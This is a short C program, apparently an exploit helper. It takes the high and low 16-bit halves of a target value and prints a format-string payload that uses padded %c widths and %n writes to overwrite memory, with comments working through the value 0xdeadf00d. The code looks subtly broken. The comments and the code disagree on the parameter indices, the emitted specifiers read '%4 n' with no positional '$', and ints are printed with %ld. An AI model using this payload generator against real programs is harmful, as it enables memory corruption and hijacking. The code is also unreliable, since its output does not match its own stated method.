// We assume that the value "address" is the 5th parameter
// // And that the value "address+2" is the 6th parameter
// // We want to write the value n=0xdeadf00d to "address"
// // Lower 16bits of n = 0xf00d = 61453
// // Higher 16bits of n = 0xdead = 57005
// // amount_higher = 61088
// // resulting in the following format string:
// // (note the parameter indices for both addresses)

#include <stdio.h>
#include <stdlib.h>

int main(int argc, const char *argv[])
{

    int higher_16bits = strtol(argv[1], NULL, 16);
    int lower_16bits = strtol(argv[2], NULL, 16);

    printf("higher 16 bits val : %ld\n", higher_16bits);
    printf("lower 16 bits val : %ld\n", lower_16bits);

    int amount_lower = lower_16bits - 8;        // make some room for the 2 addresses prepended
    int amount_higher = (higher_16bits - lower_16bits + 0x10000) & 0xffff;

    int param_lower = 4;
    int param_higher = 5;

    printf("%%%dc %%%d n %%%dc %%%d n\n", amount_lower, param_lower, amount_higher, param_higher);
    return 0;

}
